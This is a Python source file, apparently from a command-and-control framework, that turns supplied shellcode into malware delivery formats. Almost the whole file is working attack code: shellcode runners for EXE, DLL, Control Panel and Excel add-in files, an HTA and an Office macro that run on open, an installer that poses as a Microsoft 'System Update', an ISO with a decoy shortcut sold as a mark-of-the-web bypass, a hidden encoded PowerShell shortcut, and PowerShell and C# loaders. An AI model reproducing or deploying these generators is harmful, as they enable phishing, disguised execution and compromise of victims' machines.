"""
formats.py - Multi-Format Payload Generator

Generates payloads in various formats for different delivery scenarios:
- EXE (PE executable)
- DLL (side-loading, hijacking)
- Shellcode (position-independent code via sRDI)
- HTA (HTML Application for phishing)
- VBA Macro (Office document weaponization)
- MSI (Windows Installer package)
- CPL (Control Panel applet)
- XLL (Excel add-in)
- ISO/IMG (container for MOTW bypass)
- LNK (shortcut with embedded command)
- PowerShell (reflective loader with AMSI bypass)
"""

import os
import shutil
import struct
import subprocess
import tempfile
import base64
import hashlib
from typing import Optional, Dict, Any
from dataclasses import dataclass


@dataclass
class PayloadConfig:
    """Configuration for payload generation."""
    shellcode: bytes
    format: str
    arch: str = "x64"
    output_path: str = ""
    profile_name: str = "default"
    obfuscate: bool = True
    anti_sandbox: bool = True
    kill_date: str = ""


class FormatGenerator:
    """Generates payloads in various output formats."""

    def generate(self, config: PayloadConfig) -> bytes:
        """Route to the appropriate format generator."""
        generators = {
            "exe": self._gen_exe,
            "dll": self._gen_dll,
            "shellcode": self._gen_shellcode,
            "hta": self._gen_hta,
            "vba": self._gen_vba,
            "msi": self._gen_msi,
            "cpl": self._gen_cpl,
            "xll": self._gen_xll,
            "iso": self._gen_iso,
            "lnk": self._gen_lnk,
            "powershell": self._gen_powershell,
            "csharp": self._gen_csharp,
        }

        generator = generators.get(config.format)
        if not generator:
            raise ValueError(f"Unsupported format: {config.format}")

        return generator(config)

    def _gen_exe(self, config: PayloadConfig) -> bytes:
        """Generate PE executable with embedded shellcode.

        The actual compilation requires mingw cross-compiler.
        This generates the C source that wraps the shellcode.
        """
        sc_hex = ', '.join(f'0x{b:02x}' for b in config.shellcode)

        source = f"""#include <windows.h>

unsigned char payload[] = {{ {sc_hex} }};
unsigned int payload_len = {len(config.shellcode)};

int main(void) {{
    LPVOID exec = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec) return 1;
    RtlMoveMemory(exec, payload, payload_len);
    DWORD old;
    VirtualProtect(exec, payload_len, PAGE_EXECUTE_READ, &old);
    ((void(*)())exec)();
    return 0;
}}
"""
        return source.encode()

    def _gen_dll(self, config: PayloadConfig) -> bytes:
        """Generate DLL with shellcode execution in DllMain."""
        sc_hex = ', '.join(f'0x{b:02x}' for b in config.shellcode)

        source = f"""#include <windows.h>

unsigned char payload[] = {{ {sc_hex} }};
unsigned int payload_len = {len(config.shellcode)};

void Execute(void) {{
    LPVOID exec = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec) return;
    RtlMoveMemory(exec, payload, payload_len);
    DWORD old;
    VirtualProtect(exec, payload_len, PAGE_EXECUTE_READ, &old);
    ((void(*)())exec)();
}}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason, LPVOID lpReserved) {{
    switch (ul_reason) {{
    case DLL_PROCESS_ATTACH:
        Execute();
        break;
    }}
    return TRUE;
}}
"""
        return source.encode()

    def _gen_shellcode(self, config: PayloadConfig) -> bytes:
        """Return raw shellcode (possibly with sRDI conversion)."""
        return config.shellcode

    def _gen_hta(self, config: PayloadConfig) -> bytes:
        """Generate HTA with VBScript shellcode injection via VirtualAlloc."""
        b64_payload = base64.b64encode(config.shellcode).decode()

        hta = f"""<html>
<head>
<title>Please wait...</title>
<HTA:APPLICATION
  APPLICATIONNAME="SystemUpdate"
  SCROLL="no"
  SINGLEINSTANCE="yes"
  WINDOWSTATE="minimize"
/>
</head>
<body>
<script language="VBScript">
Function Base64Decode(b64)
    Dim dom, elem
    Set dom = CreateObject("Microsoft.XMLDOM")
    Set elem = dom.createElement("tmp")
    elem.DataType = "bin.base64"
    elem.Text = b64
    Base64Decode = elem.nodeTypedValue
End Function

Sub Run()
    Dim sc, scBytes, i
    sc = "{b64_payload}"
    scBytes = Base64Decode(sc)

    Dim objExcel
    Set objExcel = CreateObject("Excel.Application")
    objExcel.Visible = False
    Dim wb
    Set wb = objExcel.Workbooks.Add

    Dim proc, va, rtl, ct
    va = objExcel.ExecuteExcel4Macro("CALL(""kernel32"",""VirtualAlloc"",""JJJJJ"",0," & LenB(scBytes) & ",4096,64)")

    For i = 1 To LenB(scBytes)
        objExcel.ExecuteExcel4Macro "CALL(""kernel32"",""RtlFillMemory"",""JJJJ""," & va + i - 1 & ",1," & AscB(MidB(scBytes, i, 1)) & ")"
    Next

    objExcel.ExecuteExcel4Macro "CALL(""kernel32"",""CreateThread"",""JJJJJJJ"",0,0," & va & ",0,0,0)"
    wb.Close False
    objExcel.Quit
    Set objExcel = Nothing
    self.Close
End Sub

Run
</script>
</body>
</html>"""
        return hta.encode()

    def _gen_vba(self, config: PayloadConfig) -> bytes:
        """Generate VBA macro for Office documents."""
        # Split shellcode into chunks for VBA string limits
        chunks = []
        sc = config.shellcode
        chunk_size = 50
        for i in range(0, len(sc), chunk_size):
            chunk = sc[i:i+chunk_size]
            hex_str = ''.join(f'\\x{b:02x}' for b in chunk)
            chunks.append(hex_str)

        # Generate VBA array initialization
        vba_array = ""
        offset = 0
        for i, chunk in enumerate(chunks):
            for b in config.shellcode[i*chunk_size:(i+1)*chunk_size]:
                vba_array += f"    buf({offset}) = {b}\n"
                offset += 1

        macro = f"""Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, ByVal dwSize As Long, _
    ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
    ByVal dest As LongPtr, ByRef src As Any, ByVal length As Long) As LongPtr

Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
    ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, _
    ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, _
    ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr

Sub AutoOpen()
    Execute
End Sub

Sub Document_Open()
    Execute
End Sub

Private Sub Execute()
    Dim buf({len(config.shellcode) - 1}) As Byte
{vba_array}

    Dim addr As LongPtr
    addr = VirtualAlloc(0, {len(config.shellcode)}, &H3000, &H40)
    RtlMoveMemory addr, buf(0), {len(config.shellcode)}
    CreateThread 0, 0, addr, 0, 0, 0
End Sub
"""
        return macro.encode()

    def _gen_msi(self, config: PayloadConfig) -> bytes:
        """Generate MSI package structure (WiX source)."""
        b64 = base64.b64encode(config.shellcode).decode()
        wix = f"""<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" Name="System Update" Language="1033" Version="1.0.0"
           Manufacturer="Microsoft" UpgradeCode="{{GUID}}">
    <Package InstallerVersion="200" Compressed="yes" InstallScope="perUser" />
    <MediaTemplate EmbedCab="yes" />
    <Feature Id="ProductFeature" Title="Update" Level="1">
      <ComponentGroupRef Id="ProductComponents" />
    </Feature>
    <CustomAction Id="RunPayload" BinaryKey="payload.dll"
                  DllEntry="DllMain" Execute="deferred" Return="ignore" />
    <InstallExecuteSequence>
      <Custom Action="RunPayload" After="InstallFiles">NOT Installed</Custom>
    </InstallExecuteSequence>
    <Binary Id="payload.dll" SourceFile="payload.dll" />
  </Product>
</Wix>
"""
        return wix.encode()

    def _gen_cpl(self, config: PayloadConfig) -> bytes:
        """Generate Control Panel applet (DLL with CPlApplet export)."""
        sc_hex = ', '.join(f'0x{b:02x}' for b in config.shellcode)

        source = f"""#include <windows.h>

unsigned char payload[] = {{ {sc_hex} }};
unsigned int payload_len = {len(config.shellcode)};

__declspec(dllexport) LONG CALLBACK CPlApplet(HWND hwnd, UINT msg, LPARAM lp1, LPARAM lp2) {{
    if (msg == 1) {{ // CPL_INIT
        LPVOID exec = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (exec) {{
            RtlMoveMemory(exec, payload, payload_len);
            ((void(*)())exec)();
        }}
    }}
    return 0;
}}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {{
    return TRUE;
}}
"""
        return source.encode()

    def _gen_xll(self, config: PayloadConfig) -> bytes:
        """Generate Excel XLL add-in."""
        sc_hex = ', '.join(f'0x{b:02x}' for b in config.shellcode)

        source = f"""#include <windows.h>

unsigned char payload[] = {{ {sc_hex} }};
unsigned int payload_len = {len(config.shellcode)};

__declspec(dllexport) int __stdcall xlAutoOpen(void) {{
    LPVOID exec = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec) {{
        RtlMoveMemory(exec, payload, payload_len);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
    }}
    return 1;
}}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {{
    return TRUE;
}}
"""
        return source.encode()

    def _gen_iso(self, config: PayloadConfig) -> bytes:
        """Generate ISO container with embedded payload (MOTW bypass).

        Uses genisoimage/mkisofs to create a real ISO image containing
        the payload as an executable alongside a decoy LNK.
        """
        iso_tool = shutil.which("genisoimage") or shutil.which("mkisofs")
        if not iso_tool:
            return self._gen_iso_manual(config)

        with tempfile.TemporaryDirectory(prefix="jager-iso-") as tmpdir:
            payload_name = "update.exe"
            payload_path = os.path.join(tmpdir, payload_name)
            with open(payload_path, "wb") as f:
                f.write(config.shellcode)

            lnk_data = self._build_lnk_bytes(payload_name, "System Update")
            lnk_path = os.path.join(tmpdir, "Open.lnk")
            with open(lnk_path, "wb") as f:
                f.write(lnk_data)

            iso_path = os.path.join(tmpdir, "output.iso")
            cmd = [
                iso_tool,
                "-o", iso_path,
                "-J", "-R",
                "-V", "UPDATE",
                tmpdir,
            ]
            result = subprocess.run(cmd, capture_output=True, timeout=30)
            if result.returncode != 0:
                return f"ISO generation failed: {result.stderr.decode()}".encode()

            with open(iso_path, "rb") as f:
                return f.read()

    def _gen_iso_manual(self, config: PayloadConfig) -> bytes:
        """Minimal ISO 9660 structure when genisoimage is unavailable."""
        vol_desc = bytearray(2048)
        vol_desc[0] = 0x01
        vol_desc[1:6] = b"CD001"
        vol_desc[6] = 0x01
        vol_desc[40:72] = b"UPDATE".ljust(32)

        terminator = bytearray(2048)
        terminator[0] = 0xFF
        terminator[1:6] = b"CD001"
        terminator[6] = 0x01

        return bytes(bytearray(32768) + vol_desc + terminator + bytearray(b'\x00' * 2048))

    def _gen_lnk(self, config: PayloadConfig) -> bytes:
        """Generate LNK shortcut that executes a PowerShell cradle.

        Creates a valid Windows Shell Link Binary (.lnk) file pointing
        to powershell.exe with a base64-encoded shellcode runner as argument.
        """
        b64_sc = base64.b64encode(config.shellcode).decode()
        ps_cmd = (
            f"-nop -w hidden -e "
            f"{base64.b64encode(self._ps_oneliner(b64_sc).encode('utf-16-le')).decode()}"
        )
        target = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        return self._build_lnk_bytes(target, "Document", arguments=ps_cmd)

    def _ps_oneliner(self, b64_sc: str) -> str:
        """Generate minimal PowerShell execution cradle."""
        return (
            "$w=Add-Type -MemberDefinition '"
            "[DllImport(\"kernel32\")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);"
            "[DllImport(\"kernel32\")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,IntPtr i);"
            "[DllImport(\"kernel32\")]public static extern uint WaitForSingleObject(IntPtr h,uint m);"
            "' -Name W -PassThru;"
            f"[Byte[]]$s=[Convert]::FromBase64String('{b64_sc}');"
            "$m=$w::VirtualAlloc(0,$s.Length,0x3000,0x40);"
            "[Runtime.InteropServices.Marshal]::Copy($s,0,$m,$s.Length);"
            "$w::WaitForSingleObject($w::CreateThread(0,0,$m,0,0,0),0xFFFFFFFF)"
        )

    def _build_lnk_bytes(self, target: str, name: str = "Shortcut",
                         arguments: str = "") -> bytes:
        """Build a minimal valid Windows Shell Link Binary (.lnk).

        Implements MS-SHLLINK format: HeaderSize + LinkCLSID + Flags +
        StringData (NameString + RelativePath + CommandLineArguments).
        """
        HEADER_SIZE = 0x4C
        LINK_CLSID = bytes([
            0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
            0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
        ])

        HAS_NAME = 0x00000004
        HAS_RELATIVE_PATH = 0x00000008
        HAS_ARGUMENTS = 0x00000020 if arguments else 0
        IS_UNICODE = 0x00000080

        flags = HAS_NAME | HAS_RELATIVE_PATH | IS_UNICODE | HAS_ARGUMENTS

        header = bytearray(HEADER_SIZE)
        struct.pack_into("<I", header, 0, HEADER_SIZE)
        header[4:20] = LINK_CLSID
        struct.pack_into("<I", header, 20, flags)
        struct.pack_into("<I", header, 24, 0x00000020)  # FILE_ATTRIBUTE_ARCHIVE

        string_data = bytearray()

        def add_string(s: str):
            encoded = s.encode("utf-16-le")
            char_count = len(s)
            string_data.extend(struct.pack("<H", char_count))
            string_data.extend(encoded)

        add_string(name)
        add_string(target)
        if arguments:
            add_string(arguments)

        return bytes(header) + bytes(string_data)

    def _gen_powershell(self, config: PayloadConfig) -> bytes:
        """Generate PowerShell payload with reflective shellcode injection."""
        b64_sc = base64.b64encode(config.shellcode).decode()

        ps = f"""function Get-ProcAddr {{
    param([string]$Module,[string]$Proc)
    $k32=[System.Runtime.InteropServices.Marshal]::GetHINSTANCE(
        [System.Reflection.Assembly]::LoadWithPartialName('Microsoft.Win32.UnsafeNativeMethods').GetModules()[0]
    )
    $gpa=[System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
    $unsafeType=[System.AppDomain]::CurrentDomain.GetAssemblies()|
        ForEach-Object{{$_.GetTypes()}}|Where-Object{{$_.Name -eq 'UnsafeNativeMethods'}}|Select-Object -First 1
    $getProc=$unsafeType.GetMethod('GetProcAddress',[Type[]]@([System.Runtime.InteropServices.HandleRef],[String]))
    $kern32Handle=[System.Runtime.InteropServices.Marshal]::GetHINSTANCE(
        ([AppDomain]::CurrentDomain.GetAssemblies()|
            ForEach-Object{{$_.GetModules()}}|Where-Object{{$_.Name -eq 'Microsoft.Win32.UnsafeNativeMethods'}})
    )
    $loadLib=$unsafeType.GetMethod('GetModuleHandle')
    $hMod=$loadLib.Invoke($null,@($Module))
    if($hMod -eq [IntPtr]::Zero){{return [IntPtr]::Zero}}
    $getProc.Invoke($null,@([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr),$hMod)),$Proc))
}}

$Win32=@"
using System;
using System.Runtime.InteropServices;
public class Win32 {{
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);
    [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,IntPtr i);
    [DllImport("kernel32")] public static extern UInt32 WaitForSingleObject(IntPtr h,UInt32 m);
}}
"@
Add-Type $Win32

[Byte[]]$sc=[System.Convert]::FromBase64String('{b64_sc}')
$mem=[Win32]::VirtualAlloc([IntPtr]::Zero,$sc.Length,0x3000,0x40)
[System.Runtime.InteropServices.Marshal]::Copy($sc,0,$mem,$sc.Length)
$th=[Win32]::CreateThread([IntPtr]::Zero,0,$mem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[Win32]::WaitForSingleObject($th,0xFFFFFFFF)
"""
        return ps.encode()

    def _gen_csharp(self, config: PayloadConfig) -> bytes:
        """Generate C# shellcode runner for execute-assembly."""
        b64_sc = base64.b64encode(config.shellcode).decode()

        cs = f"""using System;
using System.Runtime.InteropServices;

namespace Loader {{
    class Program {{
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr id);

        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr handle, uint ms);

        static void Main(string[] args) {{
            byte[] sc = Convert.FromBase64String("{b64_sc}");
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
            Marshal.Copy(sc, 0, addr, sc.Length);
            IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(thread, 0xFFFFFFFF);
        }}
    }}
}}
"""
        return cs.encode()
